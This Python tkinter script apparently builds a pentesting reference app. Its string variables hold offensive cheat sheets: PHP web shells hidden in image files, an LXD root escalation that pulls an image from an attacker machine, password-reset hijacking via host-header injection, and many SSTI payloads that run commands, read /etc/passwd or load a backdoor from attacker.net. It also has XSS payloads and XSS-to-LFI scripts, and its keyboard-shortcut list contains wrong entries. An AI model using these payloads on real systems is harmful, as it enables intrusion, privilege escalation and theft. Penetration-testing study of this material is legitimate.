from tkinter import *
import webview
import requests



find_subdomains = '''                           		 		  	    					      𝘀𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗲𝗻𝘂𝗺𝗲𝗿𝗮𝘁𝗶𝗼𝗻\n\n
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝘄𝘂𝗳𝘇𝘇 ]

sudo wfuzz -c -f sub-fighter.txt -Z -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200,202,204,301,302,307,403 <targetURL>

[ 𝙉𝙤𝙬 𝙮𝙤𝙪 𝙢𝙖𝙮 𝙜𝙚𝙩 𝙖 𝙩𝙤𝙣 𝙤𝙛 𝙤𝙪𝙩𝙥𝙪𝙩 𝙩𝙝𝙖𝙩 𝙨𝙝𝙤𝙬𝙨 𝙫𝙖𝙡𝙞𝙙 𝙨𝙪𝙗𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙙𝙚𝙥𝙚𝙣𝙙𝙞𝙣𝙜 𝙤𝙣 𝙝𝙤𝙬 𝙩𝙝𝙚 𝙨𝙞𝙩𝙚 𝙞𝙨 𝙘𝙤𝙣𝙛𝙞𝙜𝙪𝙧𝙚𝙙.
𝙄𝙛 𝙮𝙤𝙪 𝙣𝙤𝙩𝙞𝙘𝙚 𝙖 𝙡𝙖𝙧𝙜𝙚 𝙖𝙢𝙤𝙪𝙣𝙩 𝙤𝙛 𝙧𝙚𝙨𝙪𝙡𝙩𝙨 𝙩𝙝𝙖𝙩 𝙘𝙤𝙣𝙩𝙖𝙞𝙣 𝙩𝙝𝙚 𝙨𝙖𝙢𝙚 𝙬𝙤𝙧𝙙 𝙘𝙤𝙪𝙣𝙩,𝙩𝙝𝙞𝙨 𝙢𝙖𝙮 𝙟𝙪𝙨𝙩 𝙗𝙚 𝙖𝙣 𝙞𝙣𝙙𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝙩𝙝𝙖𝙩 𝙩𝙝𝙚 𝙨𝙞𝙩𝙚 𝙧𝙚𝙩𝙪𝙧𝙣𝙨 𝙖 200 𝙧𝙚𝙨𝙥𝙤𝙣𝙨𝙚, 𝙗𝙪𝙩 𝙞𝙩 𝙟𝙪𝙨𝙩 𝙙𝙞𝙨𝙥𝙡𝙖𝙮𝙨 𝙖 “𝙉𝙤𝙩 𝙛𝙤𝙪𝙣𝙙” 𝙚𝙧𝙧𝙤𝙧

[ 𝙏𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝙧𝙚𝙨𝙪𝙡𝙩𝙨 𝙬𝙞𝙩𝙝 𝙖 𝙨𝙥𝙚𝙘𝙞𝙛𝙞𝙘 𝙬𝙤𝙧𝙙 𝙘𝙤𝙪𝙣𝙩, 𝙮𝙤𝙪 𝙘𝙖𝙣 𝙖𝙥𝙥𝙚𝙣𝙙 𝙮𝙤𝙪𝙧 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙬/ --𝙝𝙬 <𝙫𝙖𝙡𝙪𝙚> ]
[ 𝙁𝙤𝙧 𝙚𝙭𝙖𝙢𝙥𝙡𝙚, 𝙤𝙪𝙧 𝙣𝙚𝙬 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙩𝙝𝙖𝙩 𝙧𝙚𝙢𝙤𝙫𝙚𝙨 𝙧𝙚𝙨𝙪𝙡𝙩𝙨 𝙩𝙝𝙖𝙩 𝙧𝙚𝙨𝙥𝙤𝙣𝙙 𝙖 𝙬𝙤𝙧𝙙 𝙘𝙤𝙪𝙣𝙩 𝙤𝙛 290 𝙬𝙤𝙪𝙡𝙙 𝙡𝙤𝙤𝙠 𝙡𝙞𝙠𝙚 𝙩𝙝𝙚 𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜 ]

wfuzz -c -f sub-fighter -w top5000.txt -u 'http://target.tld' -H "Host: FUZZ.target.tld" --hw 290

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝘀𝘂𝗯𝗹𝗶𝘀𝘁𝟯𝗿 ]

sublist3r -d <domian name>

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗴𝗼𝗯𝘂𝘀𝘁𝗲𝗿 ]

gobuster dns -d erev0s.com -w awesome_wordlist.txt -i


gobuster vhost -u erev0s.com -w awesome_wordlist.txt -v
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

curl = '''                           		 		  	    					      𝗰𝗨𝗥𝗟 𝗖𝗵𝗲𝗮𝘁𝗦𝗵𝗲𝗲𝘁\nCommand																Description
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -h	 						 									cURL help menu
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl inlanefreight.com	 						 									Basic GET request
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -s -O inlanefreight.com/index.html	 						 									Download file
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -k https://inlanefreight.com	 						 									Skip HTTPS (SSL) certificate validation
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl inlanefreight.com -v	 						 									Print full HTTP request/response details
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -I https://www.inlanefreight.com	 						 									Send HEAD request (only prints response headers)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -i https://www.inlanefreight.com	 						 									Print response headers and response body
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl https://www.inlanefreight.com -A 'Mozilla/5.0'	 						 									Set User-Agent header
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -u admin:admin http://<SERVER_IP>:<PORT>/	 						 									Set HTTP basic authorization credentials
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl http://admin:admin@<SERVER_IP>:<PORT>/	 						 									Pass HTTP basic authorization credentials in the URL
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/	 						 									Set request header
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'	 						 									Pass GET parameters
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/	 						 									Send POST request with POST data
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/	 						 									Set request cookies
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl http://<SERVER_IP>:<PORT>/api.php/city/london	 						 									Read entry
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq	 						 									Read all entries
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City	 						 									Delete entry
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php	 						 									Send POST request with JSON data
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''


keyboard = '''                           		 		  	    					      𝗞𝗲𝘆𝗯𝗼𝗮𝗿𝗱 𝘀𝗵𝗼𝗿𝘁𝗰𝘂𝘁𝘀\n

Keyboard Shortcut	              Use of the keyboard shortcut
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-Alt-t				Open a new Terminal
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-d				Close a terminal
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-c				Cancels the currently running command
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-l				Clears the screen just like clear command
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-a				Move the cursor to the beginning of the line
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-e				Move the cursor to the end of the line
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-f				Move the cursor forward by one character
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-b				Move the cursor backward by one character
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Alt-f				Move the cursor forward by one word
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Alt-b				Move the cursor backward by one word
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-d				Delete the character at the cursor location
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-t				Exchange the character at the current location
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Ctrl-u				Erases the complete line
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Alt-t				Exchange the word at the current location
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Alt-l				Move the cursor backward by one character
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Alt-u				Convert the characters of a word to lowercase
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Alt-b				Convert the characters of a word to uppercase
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''




bfuf = """                           		 		  	    					      𝗕𝘆𝗽𝗮𝘀𝘀 𝗙𝗶𝗹𝗲 𝗨𝗽𝗹𝗼𝗮𝗱 𝗙𝗶𝗹𝘁𝗲𝗿𝗶𝗻𝗴

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗰𝗵𝗮𝗻𝗴𝗲 𝘁𝗵𝗲 𝗳𝗶𝗹𝗲 𝗵𝗲𝗮𝗱𝗲𝗿 𝘁𝗼 𝗚𝗜𝗙𝟴𝟵𝗮 ]

GIF89a;
<?
system($_GET['cmd']);
?>

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝗶𝗻𝗷𝗲𝗰𝘁 𝗽𝗵𝗽 𝗰𝗼𝗱𝗲 𝗶𝗻𝘀𝗶𝗱𝗲 𝗮 𝗶𝗺𝗮𝗴𝗲 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 𝗲𝘅𝗶𝗳𝘁𝗼𝗼𝗹 ]


exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg

mv evil.jpg evil.php.jpg

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
"""


lxd = """                           		 		  	    					      𝗹𝘅𝗰/𝗹𝘅𝗱 𝗽𝗿𝗶𝘃𝗲𝘀𝗰
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[ 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙 𝙖𝙣𝙙 𝙗𝙪𝙞𝙡𝙙 𝙖𝙣 𝙞𝙢𝙖𝙜𝙚 ]

git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

[ 𝙪𝙥𝙡𝙤𝙖𝙙 𝙩𝙝𝙚 𝙞𝙢𝙖𝙜𝙚 𝙛𝙞𝙡𝙚 𝙛𝙧𝙤𝙢 𝙩𝙝𝙚 𝙖𝙩𝙩𝙖𝙘𝙠𝙚𝙧 𝙢𝙖𝙘𝙝𝙞𝙣𝙚 ]

python -m SimpleHTTPServer


[ 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙 𝙩𝙝𝙚 𝙞𝙢𝙖𝙜𝙚 𝙛𝙞𝙡𝙚 𝙩𝙤 𝙫𝙞𝙘𝙩𝙞𝙢 𝙢𝙖𝙘𝙝𝙞𝙣𝙚 ]

cd /tmp
wget http://attacker-machine-ip:8000/apline-v3.10-x86_64-someting.tar.gz


[ 𝙞𝙢𝙥𝙤𝙧𝙩 𝙩𝙝𝙚 𝙡𝙭𝙘 𝙞𝙢𝙖𝙜𝙚 ]

lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage


[ 𝙘𝙝𝙚𝙘𝙠 𝙩𝙝𝙚 𝙡𝙭𝙘 𝙞𝙢𝙖𝙜𝙚 ]

lxc image list


[ 𝙣𝙤𝙬 𝙧𝙪𝙣 𝙩𝙝𝙚𝙨𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙤𝙣 𝙩𝙖𝙧𝙜𝙚𝙩 𝙢𝙖𝙘𝙝𝙞𝙣𝙚 ]

lxc init
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
"""

php_filter = '''
                           		 		  	     
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗲𝗻𝗰𝗼𝗱𝗲 𝗮𝘀 𝗕𝗮𝘀𝗲𝟲𝟰 ]

php://filter/convert.base64-encode/resource=

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗲𝗻𝗰𝗼𝗱𝗲 𝗮𝘀 𝗿𝗼𝘁𝟲𝟰 ]

php://filter/read=string.rot13/resource=
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

bypass401_403 = '''
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
GET /api/getUser --> 403
GET / + X-Original-URL : /api/GetUser --> 200
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
GET /api/getUser --> 403
GET / + Referer : https://site.com/api/GetUser --> 200

𝗼𝗿

GET /api/getUser + Referer : https://site.com/api/GetUser --> 200
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

test_pass_reset = '''                           		 		  	    					      𝗧𝗲𝘀𝘁𝗶𝗻𝗴 𝗽𝗮𝘀𝘀𝘄𝗼𝗿𝗱 𝗿𝗲𝘀𝗲𝘁 𝗳𝘂𝗻𝗰𝘁𝗶𝗼𝗻𝗮𝗹𝗶𝘁𝗶𝗲𝘀
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[*] Include controlled mail as a second parameter
[*] Bruteforce reset token
[*] Try to use a reset token on another account
[*] Try to figure out how token are generated
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[1] Include your mail as a second parameter (also you might receive the reset link):

POST /reset
[...]
email=target@xyz.com&email=hacker@hack.com

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[2] Brute force reset token if it is numeric.
You can use IP Rotator or Burpsuite to bypass rate limit in case it's IP based:

POST /reset
[...]
email=target@xyz.com&code=$BTUREFORCE$

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[3] Try to use your reset on target's account

POST /reset
[...]
email=target@xyz.com&code=$YOUR-TOKEN$

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

[4] Host header injection ; change website.com to attacker.com
(victim might receive the reset link with your host insted of the original website's)

POST /reset
HOST attacker.com
[...]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[5] Try to figure out how the token are generated.
Examples can be:

* Generated based on TimeStamp
* Generated based on the ID of the user
* Generated based on the email of the user
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''



ssti_payloads = '''                           		 							𝗦𝗲𝗿𝘃𝗲𝗿 𝗦𝗶𝗱𝗲 𝗧𝗲𝗺𝗽𝗹𝗮𝘁𝗲 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 (𝗦𝗦𝗧𝗜) 𝗖𝗵𝗲𝗮𝘁𝗦𝗵𝗲𝗲𝘁
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{ "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("id").read()}}

{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗣𝗼𝗹𝘆𝗴𝗹𝗼𝘁 ]

${{<%[%'"}}%\\.

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗙𝗿𝗲𝗲𝗠𝗮𝗿𝗸𝗲𝗿 (𝗝𝗮𝘃𝗮) ]
${7*7} = 49
<#assign command="freemarker.template.utility.Execute"?new()> ${ command("cat /etc/passwd") }

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗝𝗮𝘃𝗮 ]

${7*7}
${{7*7}}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.html").getContent()}
${T(java.lang.System).getenv()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗚𝗼𝗹𝗮𝗻𝗴 ]

{{ . }}
{{.Email}}
{{.Password}}
{{ .system "id" }}

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗧𝘄𝗶𝗴 (𝗣𝗛𝗣) ]

{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗦𝗺𝗮𝗿𝘁𝘆 (𝗣𝗛𝗣) ]

{$smarty.version}
{php}echo `id`;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗛𝗮𝗻𝗱𝗹𝗲𝗯𝗮𝗿𝘀(𝗡𝗼𝗱𝗲𝗝𝗦) ]

wrtz{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗩𝗲𝗹𝗼𝗰𝗶𝘁𝘆 ]

#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗘𝗥𝗕 (𝗥𝘂𝗯𝘆) ] 

<%= system("whoami") %>
<%= Dir.entries('/') %>
<%= File.open('/example/arbitrary-file').read %>


────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗗𝗷𝗮𝗻𝗴𝗼 𝗧𝗿𝗶𝗰𝗸𝘀 (𝗣𝘆𝘁𝗵𝗼𝗻) ]

{% debug %}
{{settings.SECRET_KEY}}


────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗧𝗼𝗿𝗻𝗮𝗱𝗼 (𝗣𝘆𝘁𝗵𝗼𝗻) ]

{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗠𝗼𝗷𝗼𝗹𝗶𝗰𝗶𝗼𝘂𝘀 (𝗣𝗲𝗿𝗹) ]

<%= perl code %>
<% perl code %>

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗙𝗹𝗮𝘀𝗸/𝗝𝗶𝗻𝗷𝗮𝟮: 𝗜𝗱𝗲𝗻𝘁𝗶𝗳𝘆 ]

{{ '7'*7 }}
{{ [].class.base.subclasses() }} # get all classes
{{''.class.mro()[1].subclasses()}}
{%for c in [1,2,3] %}{{c,c,c}}{% endfor %}

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗙𝗹𝗮𝘀𝗸/𝗝𝗶𝗻𝗷𝗮𝟮 ]

{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗝𝗮𝗱𝗲 ]

#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}

────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ 𝗥𝗮𝘇𝗼𝗿 (.𝗡𝗲𝘁) ]

@(1+2)
@{// C# code}
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

xss_payloads='''                           		 		  	    					      𝗫𝗦𝗦 𝗯𝗮𝘀𝗶𝗰 𝗽𝗮𝘆𝗹𝗼𝗮𝗱𝘀\n\n
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
<img src=x>
<script>alert('XSS')</script>
"><script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<embed src="javascript:alert(1)">
<img src="javascript:alert(1)">
<image src="javascript:alert(1)">
<script src="javascript:alert(1)">
<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
<d3"<"/onclick="1>[confirm``]"<">z
<d3/onmouseenter=[2].find(confirm)>z
<details open ontoggle=confirm()>
<script y="><">/*<script* */prompt()</script
<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
<a href="javascript%26colon;alert(1)">click
<a href=javas&#99;ript:alert(1)>click
<script/"<a"/src=data:=".<a,[8].some(confirm)>
<svg/x=">"/onload=confirm()//
<--`<img/src=` onerror=confirm``> --!>
<svg%0Aonload=%09((pro\u006dpt))()//
<sCript x>(((confirm)))``</scRipt x>
<svg </onload ="1> (_=prompt,_(1)) "">
<!--><script src=//14.rs>
<embed src=//14.rs>
<script x=">" src=//15.rs></script>
<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
<iframe/src \\/\\/onload = prompt(1)
<x oncut=alert()>x
<svg onload=write()>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

xss_polyglot = '''										 				𝗫𝗦𝗦 𝗽𝗼𝗹𝘆𝗴𝗹𝗼𝘁
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'">*/--></title></style></textarea></script%0A><img src=x onerror=confirm(1)>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) 
type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''
xss_to_lfi = '''                           		 		  	    					      			𝗫𝗦𝗦 𝘁𝗼 𝗟𝗙𝗜\n\n
[ 𝗺𝗼𝘀𝘁 𝗰𝗼𝗺𝗺𝗼𝗻 𝗽𝗮𝘆𝗹𝗼𝗮𝗱 ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ script ]

<script>
    x=new XMLHttpRequest;
    x.onload=function(){
        document.write(this.responseText)
    };
    x.open("GET","file:///etc/passwd");
    x.send();
</script>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ iframe ]

<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[ script and iframe with document.write ]

<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
'''

xss_dorks = '''                           		 		  	    					      				𝗧𝗼𝗽 𝗫𝗦𝗦 𝗱𝗼𝗿𝗸𝘀\n\n
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
?q={payload}
?s={payload}
?search={payload}
?id={payload}
?lang={payload}
?keyword={payload}
?query={payload}
?page={payload}
?keywords={payload}
?year={payload}
?view={payload}
?email={payload}
?type={payload}
?name={payload}
?p={payload}
?month={payload}
?immagine={payload}
?list_type={payload}
?url={payload}
?terms={payload}
?catagortid={payload}
